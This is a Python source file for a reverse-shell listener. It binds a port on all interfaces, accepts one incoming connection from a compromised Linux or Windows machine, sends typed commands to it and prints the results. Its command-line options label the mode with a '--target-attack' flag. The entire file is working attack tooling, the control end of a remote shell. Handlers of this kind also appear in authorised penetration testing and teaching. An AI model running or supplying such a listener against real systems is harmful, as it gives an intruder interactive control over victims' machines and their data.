import socket
import threading
import sys
import signal
import argparse

server_socket = None
client_socket = None

def signal_handler(sig, frame):
    global server_socket, client_socket
    print("\nInterrupt received. Closing server...")
    if client_socket:
        client_socket.close()
    if server_socket:
        server_socket.close()
    sys.exit(0)

def handle_client_connection_linux(client_socket):
    buffer = ""
    while True:
        try:
            data = client_socket.recv(4096)
            if not data:
                break

            buffer += data.decode('utf-8')

            while True:
                prompt_index = buffer.find('$')

                if prompt_index != -1:
                    if prompt_index > 0:
                        print(buffer[:prompt_index].strip())

                    buffer = buffer[prompt_index+1:]

                    print("\n$ ", end="", flush=True)
                else:
                    break

        except Exception as e:
            print(f"Error receiving data: {e}")
            break

def send_commands_to_client_linux(client_socket):
    while True:
        print("$ ", end="", flush=True)
        command = input().strip()

        if command.lower() in ["exit", "quit"]:
            client_socket.close()
            break

        if command:
            try:
                client_socket.sendall((command + '\n').encode('utf-8'))
            except Exception as e:
                print(f"Error sending data: {e}")
                break

def start_server_linux(host='0.0.0.0', port=4444):
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    server_socket.bind((host, port))

    server_socket.listen(1)
    print(f"Listening on {host}:{port}")

    try:
        client_socket, client_address = server_socket.accept()
        print(f"[*] Connection established with {client_address[0]}:{client_address[1]}")

        receive_thread = threading.Thread(target=handle_client_connection_linux, args=(client_socket,))
        send_thread = threading.Thread(target=send_commands_to_client_linux, args=(client_socket,))

        receive_thread.start()
        send_thread.start()

        send_thread.join()
        receive_thread.join()

    except KeyboardInterrupt:
        print("Server stopped.")

    finally:
        server_socket.close()

def shell_server_windows(host, port):
    global server_socket, client_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(1)

    print(f"[*] Listening on {host}:{port}")

    try:
        client_socket, client_address = server_socket.accept()
        print(f"[*] Connection established with {client_address[0]}:{client_address[1]}")

        while True:
            command = input("\nShell> ").strip()

            if command.lower() in ["exit", "quit"]:
                break

            client_socket.sendall((command + '\n').encode('utf-8'))

            response = b""
            while True:
                part = client_socket.recv(4096)
                if not part:
                    break
                response += part

                if b"END_OF_COMMAND" in response:
                    break

            final_response = response.decode('utf-8', errors='replace').strip()
            final_response = final_response.replace("END_OF_COMMAND", "")
            print_formatted_response(final_response)

    except Exception as e:
        print(f"Error: {e}")
    finally:
        if client_socket:
            client_socket.close()
        if server_socket:
            server_socket.close()

def print_formatted_response(response):
    lines = response.splitlines()
    for line in lines:
        if line.strip():
            print(line)

def main():
    parser = argparse.ArgumentParser(description="Start a server for either Linux or Windows.")
    parser.add_argument("--port", type=int, required=True, help="Port to listen on")
    parser.add_argument("--target-attack", type=str, required=True, choices=["linux", "windows"], help="Target system to attack")

    args = parser.parse_args()

    port = args.port
    os_type = args.target_attack

    signal.signal(signal.SIGINT, signal_handler)

    if os_type == 'linux':
        start_server_linux(port=port)
    elif os_type == 'windows':
        shell_server_windows("0.0.0.0", port)

if __name__ == "__main__":
    main()
